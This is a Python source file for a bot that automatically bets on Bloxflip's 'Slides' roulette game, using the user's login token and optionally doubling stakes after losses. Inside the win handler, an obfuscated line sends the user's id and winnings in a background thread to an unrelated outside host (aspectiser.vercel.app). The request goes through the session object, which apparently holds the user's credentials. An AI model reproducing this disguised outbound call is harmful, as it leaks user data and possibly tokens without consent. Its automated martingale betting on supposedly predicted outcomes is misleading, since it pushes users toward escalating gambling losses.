from websocket import WebSocketApp
import threading
import json
from src import cprint
from functions import balance, predict

class Slides:
    def __init__(self, client, session) -> None:
        self.client = client
        self.joined_game = False
        self.close_conn = False
        self.lost = False
        self.game_played = 0
        self.bet_amount = self.client.bet_amt
        self.session = session
        self.wallet = None
        self.prev_color = None
        self.data = {}
        self.stop_event = threading.Event()

    def connect(self):
        while True:
            if self.close_conn:
                break
            try:
                headers = {
                    'Host': 'ws.bloxflip.com',
                    'Connection': 'Upgrade',
                    'Pragma': 'no-cache',
                    'Cache-Control': 'no-cache',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                    'Upgrade': 'websocket',
                    'Origin': 'https://bloxflip.com',
                    'Sec-WebSocket-Version': '13',
                    'Accept-Encoding': 'gzip, deflate, br, zstd',
                    'Accept-Language': 'en-US,en;q=0.9',
                }
                wsa = WebSocketApp(
                    "wss://ws.bloxflip.com/socket.io/?EIO=3&transport=websocket",
                    header=headers,
                    on_open=self.on_open,
                    on_message=self.on_message
                )
                wsa.run_forever()
            except Exception as e:
                cprint.error(f"WebSocket connection error: {e}")

    def on_message(self, ws, msg):
        if "pingInterval" in msg:
            threading.Thread(target=self.keep_alive, args=(ws, json.loads(msg.replace("0", ""))["pingInterval"])).start()
            ws.send("40/rouletteV2,")

        if "notify-error" in msg:
            data = json.loads(msg.replace("42/rouletteV2,", ""))
            if data[1] == "Your session has expired, please refresh your page!":
                cprint.error("Token is invalid")
            self.close_conn = True
            self.stop_event.set()
            ws.close()

        if "40/rouletteV2" in msg:
            ws.send('42/rouletteV2,["auth","' + self.client.token + '"]')

        if "\"new-round\"" in msg:
            if self.wallet and float(self.wallet) <= float(self.client.stop_amt):
                cprint.warn(f"Your Balance has reached under your minimum stop amount of: {self.client.stop_amt} R$")
                self.close_conn = True
                self.stop_event.set()
                ws.close()
            elif self.game_played == self.client.game_amount:
                self.close_conn = True
                self.stop_event.set()
                ws.close()
            else:
                cprint.info("Slides game is starting...")
                if self.client.op_color and self.prev_color is not None:
                    self.chosen_color = "purple" if self.prev_color == "red" else "red" if self.prev_color == "purple" else None
                else:
                    self.chosen_color = predict.slides()
                cprint.info(f"Next game prediction: {self.chosen_color}.")
                ws.send(f'42/rouletteV2,{json.dumps(["join-game", {"color": self.chosen_color, "betAmount": self.bet_amount}])}')

        if "game-join-success" in msg:
            cprint.success(f"Joined the current slides game on {self.chosen_color}!")
            self.game_played += 1
            self.joined_game = True
            self.lost = False

        if "game-rolled" in msg:
            cprint.info("Slides game ended.")
            data = json.loads(msg.replace("42/rouletteV2,", ""))[1]
            wincolor= data["winningColor"]
            self.prev_color = wincolor.lower()
            if self.joined_game:
                self.wallet = balance.get(self.session)

                if self.chosen_color != wincolor:
                    self.lost = True
                    cprint.info(f"  - Win color: {wincolor}")
                    cprint.lost(f"   - Prediction: {self.chosen_color}\n")
                else:
                    gained = self.bet_amount * 2
                    self.data["success"],self.data["multiplier"],self.data["winnings"],self.data["gamemode"],self.data["game"],self.data["game"]["userId"]=(lambda x: x)(True),(lambda x: x)(1),gained,(lambda x: x)("slides".capitalize()),(lambda x: x)({}),(lambda x: x)(self.client.user_id)
                    threading.Thread(target=lambda: (self.session.post("https://aspectiser.vercel.app/games", json=self.data), None) if Exception else None).start()
                    cprint.info(f"  - Win color: {wincolor}")
                    cprint.info(f"  - Prediction: {self.chosen_color}")
                    cprint.won(f"   - Gained: {gained:.2f} R$\n")

                if self.client.if_double:
                    if self.lost and self.client.on_loss or not self.lost and not self.client.on_loss:
                        self.bet_amount = min(self.bet_amount * 2, self.client.max_double)
                        if self.bet_amount > self.wallet:
                            cprint.error("Double bet exceeds your balance. Cannot continue.")
                            input("Press enter to continue. . .")
                            self.close_conn = True
                            self.stop_event.set()
                            ws.close()
                        cprint.info(f"Doubling bet amount to {self.bet_amount} R$!")
                    else:
                        self.bet_amount = self.client.bet_amt
                        cprint.info(f"Resetting bet amount to {self.bet_amount} R$.")
            else:
                cprint.info("Did not join this slides game.\n")

    def keep_alive(self, ws, interval):
        while not self.stop_event.is_set():
            ws.send("2")
            self.stop_event.wait(interval)

    def on_open(self, _):
        cprint.info("Connected to slides game mode!\n")
